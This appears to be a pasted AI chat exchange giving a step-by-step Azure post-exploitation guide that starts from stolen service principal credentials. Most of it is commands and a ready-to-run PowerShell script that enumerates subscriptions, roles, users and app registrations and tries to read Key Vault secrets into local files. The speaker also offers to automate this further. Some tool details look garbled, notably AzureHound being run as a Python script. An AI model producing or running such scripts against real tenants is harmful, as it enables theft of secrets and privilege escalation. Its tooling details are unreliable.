# Enumerate Azure IAM Credential from Compromised Credentials

When conducting a penetration test in Azure, it's critical to enumerate the permissions associated with a compromised Microsoft Entra credential set (client ID, client secret, tenant ID). This helps identify potential privilege escalation paths, accessible services, or sensitive actions the account can perform.

**Tool Recommendation:
[MICROSOFT-AZURE-AD-PERMISSIONS-ENUMERATOR](https://github.com/NetSPI/MicroBurst)**

For Azure, NetSPI’s
[**MicroBurst**](https://github.com/NetSPI/MicroBurst) or
[**AzureHound**](https://github.com/BloodHoundAD/AzureHound) can be used
to enumerate effective permissions.

**Example with MicroBurst's Get-AzDomainInfo and Get-AzPasswords**

\# Clone the repo

git clone https://github.com/NetSPI/MicroBurst.git

cd MicroBurst

\# Set environment variables or provide creds in the command

Import-Module .\MicroBurst.psm1

\# Example: Connect with service principal creds

\$creds = New-Object System.Management.Automation.PSCredential
("\<client-id\>", (ConvertTo-SecureString "\<client-secret\>"
-AsPlainText -Force))

Connect-AzAccount -ServicePrincipal -Credential \$creds -Tenant
"\<tenant-id\>"

\# Enumerate key permissions

Get-AzDomainInfo

Invoke-EnumerateAzureSubDomains

Get-AzPasswords

Invoke-EnumerateAzureBlobs

------------------------------------------------------------------------

**Example Output (Abbreviated)**

\[\*\] Successfully authenticated to Azure AD

\[\*\] Enumerating Azure domain info...

\[+\] Domain: contoso.onmicrosoft.com

\[\*\] Checking for key vault access...

\[+\] List of accessible KeyVaults:

\- kv-backingstore

\[\*\] Found permission to list blobs on storage account 'backups001'

\[\*\] Found AppRole assignment: Contributor on subscription xyz-123-abc

------------------------------------------------------------------------

**Key Actions to Look For**

- **Get-AzRoleAssignment** → View role assignments

- **Get-AzKeyVaultSecret** → Access secrets (if permissions allow)

- **List Storage Containers / Blobs**

- **List App Registrations** → Potential lateral movement

- **Enumerate SPNs / Roles / Groups**

------------------------------------------------------------------------

**Goal**

Determine what the compromised account *can do*, such as:

- Read secrets from Key Vault

- Dump storage account contents

- Escalate privileges via Contributor roles

- Enumerate Azure AD users and groups

------------------------------------------------------------------------

Would you like a step-by-step command sequence for full Azure
enumeration using service principal creds?

Great — here’s a **step-by-step guide** for enumerating permissions and
assets in Azure after compromising a **Service Principal (SP)**
credential set, which includes:

- **Client ID**

- **Client Secret**

- **Tenant ID**

We’ll use **MicroBurst**, **Azure PowerShell**, and **Az CLI** to cover
various vectors of enumeration.

------------------------------------------------------------------------

**🛠️ Setup**

**1. Install Azure PowerShell**

Install-Module -Name Az -AllowClobber -Scope CurrentUser

**2. Install MicroBurst**

git clone https://github.com/NetSPI/MicroBurst.git

cd MicroBurst

------------------------------------------------------------------------

**🔐 Authenticate with SP Credentials**

\$clientId = "\<client-id\>"

\$clientSecret = "\<client-secret\>"

\$tenantId = "\<tenant-id\>"

\$secureSecret = ConvertTo-SecureString \$clientSecret -AsPlainText
-Force

\$creds = New-Object
System.Management.Automation.PSCredential(\$clientId, \$secureSecret)

Connect-AzAccount -ServicePrincipal -Credential \$creds -Tenant
\$tenantId

------------------------------------------------------------------------

**🕵️ Enumeration Steps (PowerShell)**

**3. Import MicroBurst**

Import-Module .\MicroBurst\MicroBurst.psm1

**4. List Subscriptions**

Get-AzSubscription

🔄 Use Set-AzContext -Subscription \<id\> to change context if needed.

------------------------------------------------------------------------

**Core Enumeration Tasks**

**5. Enumerate Roles and Access**

Get-AzRoleAssignment

Get-AzRoleDefinition

**6. Find Key Vaults and Secrets**

Get-AzKeyVault \# List accessible vaults

Get-AzKeyVaultSecret -VaultName \<name\> \# Dump secrets (if allowed)

**7. Enumerate Storage Accounts & Files**

Get-AzStorageAccount

Invoke-EnumerateAzureBlobs -Verbose \# From MicroBurst

**8. Enumerate App Registrations / Service Principals**

Get-AzADApplication

Get-AzADServicePrincipal

**9. Enumerate Users and Groups**

Get-AzADUser

Get-AzADGroup

------------------------------------------------------------------------

**Advanced/Optional Enumeration**

- Invoke-EnumerateAzureSubDomains — Enum external assets via DNS

- Invoke-EnumerateAzureRM — All-in-one enumeration script

- AzureHound — Collects Azure AD data for BloodHound analysis (great for
  privilege escalation paths)

------------------------------------------------------------------------

**📦 Az CLI Alternative (Linux-Compatible)**

az login --service-principal -u \<client-id\> -p \<client-secret\>
--tenant \<tenant-id\>

az account list

az role assignment list

az keyvault list

az keyvault secret list --vault-name \<vault\>

az storage account list

------------------------------------------------------------------------

Let me know if you want to script this into an automated
post-exploitation module or integrate with BloodHound/AzureHound.

Perfect. Below is a **modular PowerShell script** to automate Azure
post-exploitation tasks using compromised Service Principal credentials.
It includes:

- SPN authentication

- Core enumeration

- Optional AzureHound data collection

------------------------------------------------------------------------

## Azure Post-Exploitation Script (PowerShell)


`\# Azure-SPN-Enum.ps1`

param (
\[Parameter(Mandatory=\$true)\]\[string\]\$ClientId,
\[Parameter(Mandatory=\$true)\]\[string\]\$ClientSecret,
\[Parameter(Mandatory=\$true)\]\[string\]\$TenantId
)

\# Convert client secret to secure string
\$secureSecret = ConvertTo-SecureString \$ClientSecret -AsPlainText -Force
\$creds = New-Object
System.Management.Automation.PSCredential(\$ClientId, \$secureSecret)

\# Connect to Azure
Write-Host "\`n\[+\] Authenticating as Service Principal..."
Connect-AzAccount -ServicePrincipal -Credential \$creds -Tenant \$TenantId \| Out-Null

\# List Subscriptions
Write-Host "\[+\] Enumerating subscriptions..."
Get-AzSubscription \| Tee-Object -FilePath "subscriptions.txt"

\# Set active subscription
\$subs = Get-AzSubscription
foreach (\$sub in \$subs) {
Write-Host "\`n\[\>\] Switching to Subscription: \$(\$sub.Name)"
Set-AzContext -SubscriptionId \$sub.Id \| Out-Null

\# Role Assignments
Write-Host "\[\*\] Roles and permissions..."
Get-AzRoleAssignment \| Tee-Object -FilePath "roles\_\$(\$sub.Name).txt"

\# Key Vaults & Secrets
Write-Host "\[\*\] Key Vault secrets (if accessible)..."
Get-AzKeyVault \| ForEach-Object {
try {
Get-AzKeyVaultSecret -VaultName \$\_.VaultName \| Tee-Object -FilePath
"kv\_\$(\$\_.VaultName).txt"
} catch {
Write-Warning "Access denied to vault: \$(\$\_.VaultName)"
}

}

\# Storage
Write-Host "\[\*\] Storage accounts..."
Get-AzStorageAccount \| Tee-Object -FilePath
"storage\_\$(\$sub.Name).txt"

\# Azure AD Users and Groups
Write-Host "\[\*\] Azure AD enumeration..."
Get-AzADUser \| Tee-Object -FilePath "users\_\$(\$sub.Name).txt"
Get-AzADGroup \| Tee-Object -FilePath "groups\_\$(\$sub.Name).txt"

\# App Registrations
Write-Host "\[\*\] App registrations..."
Get-AzADApplication \| Tee-Object -FilePath "apps\_\$(\$sub.Name).txt"
}
Write-Host "\`n\[+\] Enumeration complete. Logs saved in current directory."

``
### Collect AzureHound Data (Optional)

Install and run [AzureHound](https://github.com/BloodHoundAD/AzureHound) from a Linux host:

\# Install dependencies (Python 3.8+, pip)

pip install -r requirements.txt

\# Collect data with SP creds

python3 AzureHound.py azure --client-id \<id\> --client-secret
\<secret\> --tenant-id \<id\> --output-file azure.zip

Upload azure.zip to BloodHound GUI for graph-based privilege escalation analysis.